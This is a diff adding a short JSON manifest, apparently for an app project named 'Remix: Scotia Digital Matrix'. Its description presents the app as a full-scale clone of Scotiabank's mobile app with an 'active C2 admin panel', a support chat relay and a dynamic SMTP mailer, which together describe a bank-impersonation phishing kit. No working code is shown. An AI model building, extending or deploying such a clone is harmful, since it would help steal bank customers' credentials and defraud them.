@@ -1,0 +1,5 @@
+{
+  "name": "Remix: Scotia Digital Matrix",
+  "description": "Full-scale Scotiabank mobile clone with active C2 admin panel, support chat relay, and dynamic SMTP mailer integration.",
+  "requestFramePermissions": []
+}
